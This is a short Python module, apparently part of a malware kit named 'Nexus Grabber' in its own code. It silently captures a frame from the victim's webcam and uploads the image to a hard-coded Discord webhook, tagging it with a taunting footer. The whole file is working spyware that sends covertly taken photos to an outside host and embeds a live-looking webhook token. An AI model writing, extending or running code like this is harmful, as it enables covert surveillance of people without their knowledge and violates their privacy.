import json
from datetime import datetime, timezone

import cv2
import requests

WEBHOOK = "https://ptb.discord.com/api/webhooks/1451526342935056460/o9AgfbB09yqG2ocP6qTy4LNVvCLe4uih8PVKwOsncvHCYkUkECIGL3zRWoFAiRIOB28v"


class Webcam:
    def __init__(self):
        pass

        

    def main(self):
        cap = cv2.VideoCapture(0)

        if cap.isOpened():
            ret, frame = cap.read()
            success, buffer = cv2.imencode(".jpg", frame)
            if success:
                data = {
                    "content": "",
                    "embeds": [
                        {
                            "title": "Webcam",
                            "description": "",
                            "image": {
                                "url": "attachment://capture.jpg"
                            },
                            "color": 0x4F31C4,
                            "footer": {"text": "Fucked by Nexus Grabber"},
                            "timestamp": datetime.now(timezone.utc).isoformat(),
                        }
                    ],
                }
                requests.post(
                    WEBHOOK,
                    data={"payload_json": json.dumps(data)},
                    files={"capture.jpg": ("capture.jpg", buffer.tobytes(), "image/jpeg")},
                )


if __name__ == "__main__":
    Webcam().main()
